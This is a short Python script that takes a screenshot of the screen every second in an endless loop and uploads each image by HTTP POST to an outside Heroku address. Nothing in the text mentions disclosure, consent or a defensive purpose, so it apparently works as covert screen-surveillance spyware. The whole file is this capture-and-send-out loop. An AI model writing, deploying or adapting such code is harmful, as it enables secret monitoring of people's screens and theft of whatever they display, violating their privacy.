from mss import mss
from time import sleep
import requests

url = 'http://lujcho.herokuapp.com/ay'

def upload_latest(filename):
    files = {'file': open(filename, 'rb')}
    requests.post(url, files=files)

with mss() as sct:
    while True:
        filename = sct.shot()
        upload_latest(filename)

        sleep(1)

